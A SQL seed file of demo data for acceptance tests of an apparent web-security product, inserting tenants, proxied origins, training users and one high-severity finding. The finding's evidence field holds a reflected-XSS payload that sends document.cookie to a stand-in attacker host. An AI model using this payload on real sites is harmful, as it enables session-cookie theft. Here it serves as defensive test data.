-- Demo data for the Part 4 acceptance tests. Safe to re-run.

insert into tenants (id, name)
values ('11111111-1111-4111-8111-111111111111', 'ShieldForge Demo')
on conflict (id) do nothing;

insert into origins (id, tenant_id, origin_url, proxy_path)
values (
  '55555555-5555-4555-8555-555555555555',
  '11111111-1111-4111-8111-111111111111',
  'https://aisummit.ieeebangalore.org',
  '/t/aisummit'
), (
  '22222222-2222-4222-8222-222222222222',
  '11111111-1111-4111-8111-111111111111',
  'https://victim-shop.vercel.app',
  '/t/victim-shop'
)
on conflict (id) do nothing;

insert into findings (id, origin_id, severity, category, title, evidence)
values (
  '33333333-3333-4333-8333-333333333333',
  '22222222-2222-4222-8222-222222222222',
  'high',
  'xss',
  'Reflected script in comment field',
  '{"payload":"<script>fetch(''https://attacker.vercel.app/c?''+document.cookie)</script>","path":"/comment"}'
)
on conflict (id) do nothing;

insert into training_users (id, name)
values
  ('44444444-4444-4444-8444-444444444444', 'Asha'),
  ('55555555-5555-4555-8555-555555555555', 'Ravi'),
  ('66666666-6666-4666-8666-666666666666', 'Meera')
on conflict (id) do nothing;
